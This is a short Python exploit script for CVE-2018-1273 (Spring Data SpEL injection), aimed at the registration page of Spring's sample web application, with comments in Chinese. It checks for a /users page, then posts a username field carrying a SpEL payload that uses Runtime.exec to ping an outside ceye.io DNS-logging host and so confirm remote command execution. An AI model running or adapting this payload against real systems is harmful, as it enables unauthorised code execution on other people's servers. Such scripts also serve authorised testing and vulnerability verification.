# -*- coding: utf-8 -*-
import requests
import random




'''
moon.py -u spring http://xxxx.xxxx.xxxx.xxxx:xx
这里利用脚本针对的是spring官方的web样例中的注册页面，实际中未必适用
'''


def attack(url):
    URL1 = url + '/users'
    try:
        re = requests.get(URL1,verify=False,timeout=5)
    except:
        print('Some error!')
    else:
        if re.status_code == 200:
            print('[+]存在风险页面，开始检测:',URL1)
            try:
                URL2 = url + '/users?page=&size=5'
                headers = {"User-Agent":'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36',
                "Referer":URL1,
                "Content-Type":'application/x-www-form-urlencoded'
                }
                randomint = random.randint(100000,999999)
                data = f'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("ping {randomint}_CVE_2018_1273.e7wqoz.ceye.io")]=&password=&repeatedPassword='
                re1 = requests.post(URL2,data=data,headers=headers)
                print('一般执行成功返回值为500，此次返回值为：',re1.status_code)
                print('此处利用ceye来确认漏洞，请登录相关账户进行确认:',f" {randomint}_CVE_2018_1273.e7wqoz.ceye.io")
            except:
                print('[-]执行payload出错！')
        else:
            print('[-]未发现漏洞页面：',URL1,re.status_code)

if __name__ == "__main__":
    attack()